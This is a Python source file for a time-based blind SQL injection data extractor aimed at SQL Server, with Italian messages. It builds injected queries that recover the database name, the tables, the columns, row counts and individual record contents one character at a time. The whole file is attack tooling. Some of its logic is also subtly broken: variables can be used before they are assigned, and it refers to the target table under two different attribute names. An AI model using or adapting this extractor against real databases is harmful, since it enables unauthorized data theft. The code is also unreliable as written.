from blind_sqli_extractor_base import BlindSQLIExtractorBase
import time


class BlindSQLITimeExtractor(BlindSQLIExtractorBase):

    def set_db_name(self, db_name: str):
        self.extracted_data.db_name = db_name

    def set_table_target(self, table_name: str):
        if self.extracted_data.tables.table_names and table_name not in self.extracted_data.tables.table_names:
            print(
                f"Errore: la tabella '{table_name}' non è presente nella lista delle tabelle scoperte. Tabelle scoperte: {self.extracted_data.tables.table_names}"
            )
            return
        self.extracted_data.target.table_name = table_name

    def extract_db_name(self):
        if self.extracted_data.db_name_length == 0:
            db_name_length = self.dump_length("LEN(db_name())")
            if not db_name_length:
                print(
                    "Errore: non è stato possibile determinare la lunghezza del nome del database. Verificare che la connessione al database sia corretta e che la funzione db_name() sia supportata."
                )
                return
            print(f"Il nome del DB è lungo {db_name_length} caratteri.")
            self.extracted_data.db_name_length = db_name_length
            self.save_extracted_data()

            time.sleep(2)

        if self.settings.optimizer == "anding":
            db_name = self.dump_string_anding("db_name()", db_name_length)
        elif self.settings.optimizer == "bisection":
            db_name = self.dump_string_bisection("db_name()", db_name_length)
        else:
            db_name = None

        print(f"Il nome del DB è: {db_name}")
        if db_name:
            self.extracted_data.db_name = db_name
            self.save_extracted_data()

        return self.extracted_data.db_name

    def extract_tables(self, num_tables_input=None):
        if not self.extracted_data.db_name:
            print(
                "Errore: è necessario scoprire/inserire prima il nome del database (funzione discoverDBName())"
            )
            return
        if not num_tables_input and not self.extracted_data.tables.total_tables_num:
            num_tables = self.dump_length(
                f"SELECT COUNT(*) FROM information_schema.tables WHERE TABLE_CATALOG='{self.extracted_data.db_name}'"
            )
            if not num_tables:
                print(
                    f"Errore: non è stato possibile determinare il numero di tabelle presenti nel database '{self.extracted_data.db_name}'. Verificare che la connessione al database sia corretta e che la query per contare le tabelle sia supportata."
                )
                return
            print(f"Il numero di tabelle nel DB è: {num_tables}")
            self.extracted_data.tables.total_tables_num = num_tables
            self.save_extracted_data()
        elif num_tables_input:
            self.extracted_data.tables.total_tables_num = num_tables_input

        for i in range(self.extracted_data.tables.total_tables_num):
            if not self.extracted_data.tables.table_names or len(self.extracted_data.tables.table_names) == 0 or self.extracted_data.tables.table_names[i].table_length == 0:
                table_name_length = self.dump_length(
                    f"select LEN(table_name) from information_schema.tables where table_catalog='{self.extracted_data.db_name}' order by table_name offset {i} rows fetch next 1 rows only"
                )
                print(f"Tabella {i} - lunghezza nome: {table_name_length}")
                self.extracted_data.tables.table_names[i].table_length = table_name_length
                self.save_extracted_data()

            q = f"select table_name from information_schema.tables where table_catalog='{self.extracted_data.db_name}' order by table_name offset {i} rows fetch next 1 rows only"
            table_name = (
                self.dump_string_anding(q, table_name_length)
                if self.settings.optimizer == "anding"
                else self.dump_string_bisection(q, table_name_length)
            )
            print(f"Tabella {i} - nome: {table_name}")
            if table_name:
                self.extracted_data.tables.table_names[i].table_name = table_name
                self.save_extracted_data()

        return self.extracted_data.tables.table_names

    def _extract_column_names(self):
        num_columns = self.dump_length(
            f"SELECT COUNT(*) FROM information_schema.columns WHERE TABLE_CATALOG='{self.extracted_data.db_name}' AND TABLE_NAME='{self.extracted_data.target.table_name}'"
        )
        if not num_columns:
            print(
                f"Errore: non è stato possibile determinare il numero di colonne presenti nella tabella '{self.extracted_data.target.table_name}'. Verificare che la connessione al database sia corretta e che la query per contare le colonne sia supportata."
            )
            return
        print(f"Il numero di colonne nella tabella {self.extracted_data.target.table_name} è: {num_columns}")
        print("Sono presenti le seguenti colonne: ", end="\r\n")

        for i in range(num_columns):
            column_name_length = self.dump_length(
                f"select LEN(column_name) from information_schema.columns where table_catalog='{self.extracted_data.db_name}' AND table_name='{self.extracted_data.target.table_name}' order by column_name offset {i} rows fetch next 1 rows only"
            )
            if self.verbose:
                print(f"Colonna {i} - lunghezza nome: {column_name_length}")

            q = f"select column_name from information_schema.columns where table_catalog='{self.extracted_data.db_name}' AND table_name='{self.extracted_data.target.table_name}' order by column_name offset {i} rows fetch next 1 rows only"
            column_name = (
                self.dump_string_anding(q, column_name_length)
                if self.settings.optimizer == "anding"
                else self.dump_string_bisection(q, column_name_length)
            )
            print(f"{i} - {column_name}")
            if column_name:
                self.extracted_data.target.column_names.append(column_name)

        return self.extracted_data.target.column_names

    def _extract_rows_length(self):
        num_rows = self.dump_length(f"SELECT COUNT(*) FROM {self.extracted_data.target.table_name}")
        if not num_rows:
            print(
                f"Errore: non è stato possibile determinare il numero di righe presenti nella tabella '{self.extracted_data.target.table_name}'. Verificare che la connessione al database sia corretta e che la query per contare le righe sia supportata."
            )
            return
        print(f"Nella tabella {self.extracted_data.target.table_name} ci sono {num_rows} righe.")
        return num_rows

    def extract_table_info(self, table_name):
        if not self.extracted_data.db_name:
            print("Errore: è necessario scoprire prima il nome del database (funzione discoverDBName())")
            return

        self.set_table_target(table_name)
        self._extract_column_names()
        self._extract_rows_length()

    def extract_record_content(self, column_name, row_number):
        if not self.table_target:
            print("Errore: è necessario impostare prima la tabella target (funzione set_table_target())")
            return

        record_length = self.dump_length(
            f"SELECT LEN({column_name}) FROM {self.table_target} ORDER BY {column_name} OFFSET {row_number - 1} ROWS FETCH NEXT 1 ROWS ONLY"
        )
        if not record_length:
            print(
                f"Errore: non è stato possibile determinare la lunghezza del contenuto della riga {row_number} nella colonna {column_name}. Verificare che la tabella '{self.table_target}' e la colonna '{column_name}' esistano e che il numero di riga sia corretto."
            )
            return
        print(
            f"La lunghezza del contenuto della riga {row_number} nella colonna {column_name} è: {record_length}"
        )

        q = f"SELECT {column_name} FROM {self.table_target} ORDER BY {column_name} OFFSET {row_number - 1} ROWS FETCH NEXT 1 ROWS ONLY"
        record_content = (
            self.dump_string_anding(q, record_length)
            if self.settings.optimizer == "anding"
            else self.dump_string_bisection(q, record_length)
        )
        print(f"Il contenuto della riga {row_number} nella colonna {column_name} è: ", end="\r\n")
        print(record_content)
        print("\r\n")

        return record_content
